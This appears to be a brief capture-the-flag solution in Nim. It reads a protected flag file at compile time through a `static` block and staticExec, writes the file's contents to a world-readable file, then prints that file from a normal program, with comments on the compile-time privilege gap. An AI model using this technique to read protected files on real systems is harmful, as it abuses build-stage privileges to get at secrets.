# This is a two step solution -- first:
static:
    let flag = staticExec("cat /opt/flag.txt")
    writeFile("/opt/box/flag_program.nim", "echo \"" & flag & "\"")

# Then:
import osproc
echo execCmd("bash -c 'cat /opt/box/flag_program.nim'")

# The way that Nim works is that, to my understanding, the `static` events are run at compile time. Because the thing which compiles are nim
# code has more permissions than the one that executes (specifically, the permission to read the flag), we need to read the flag in the static
# call. We can write this output to a new file which can be read by anything, and cat it with the next, non static function.